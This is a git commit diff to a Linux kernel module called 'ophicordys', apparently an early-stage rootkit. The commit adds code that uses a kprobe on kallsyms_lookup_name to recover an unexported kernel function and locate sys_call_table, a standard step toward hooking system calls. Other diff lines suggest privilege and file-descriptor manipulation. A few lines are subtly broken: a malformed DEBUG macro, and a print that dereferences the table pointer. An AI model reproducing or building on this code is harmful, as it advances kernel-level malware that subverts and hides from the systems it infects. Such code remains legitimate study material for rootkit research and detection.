20a6f4ccba1bd2e41bad0a6be02940e7e61b6393
Thomas Gingele <b1tc0r3@proton.me>
2024-09-14 21:59:13 +0200

    Add get_syscall_table

--- ophicordys.c
+++ ophicordys.c
@@ -1,14 +1,29 @@
 #include <linux/init.h>
 #include <linux/module.h>
+#include <linux/syscalls.h>
 #include <linux/uaccess.h>
 #include <linux/fs.h>
-#include <linux/proc_fs.h>
+#include <linux/proc_ns.h>
+#include <linux/sched.h>
+#include <linux/dirent.h>
+#include <linux/slab.h>
+#include <linux/version.h>
+#include <linux/fdtable.h>
+#include <linux/kprobes.h>
 
 #include "ophicordys.h"
+
+#define KPROBE_LOOKUP 1
 
 MODULE_AUTHOR("B1TC0R3");
 MODULE_DESCRIPTION("Example LKM");
 MODULE_LICENSE("GPL");
+
+typedef unsigned long (*kln_func_t)(const char* name);
+
+static struct kprobe probe = {
+    .symbol_name = "kallsyms_lookup_name"
+};
 
 int get_system(void) {
     struct task_struct *current_task = get_current();
@@ -34,9 +49,31 @@ int get_system(void) {
     return 0;
 }
 
+unsigned long* get_syscall_table(void) {
+    unsigned long* syscall_table;
+
+    register_kprobe(&probe);
+    kln_func_t kallsyms_lookup_name = (kln_func_t) probe.addr;
+    unregister_kprobe(&probe);
+
+    syscall_table = (unsigned long*) kallsyms_lookup_name("sys_call_table");
+
+    return syscall_table;
+}
+
 static int __init ophicordys_init(void) {
     int pid = task_pid_nr(current);
     printk(KERN_INFO "%s: module loaded (PID: %i).\n", THIS_MODULE->name, pid);
+
+    unsigned long* syscall_table = get_syscall_table();
+    if (syscall_table != NULL) {
+        printk(KERN_INFO "%s: syscall table located at: %lx\n", THIS_MODULE->name, *syscall_table);
+
+    } else {
+        printk(KERN_INFO "%s: failed to fetch syscall table.\n", THIS_MODULE->name);
+
+    }
+
     return 0;
 }
 
--- ophicordys.h
+++ ophicordys.h
@@ -1,1 +1,6 @@
+// Produce kernel logs when set to 1
+#define DEBUG = 1
+
+// Function prototypes
 int get_system(void);
+unsigned long* get_syscall_table(void);
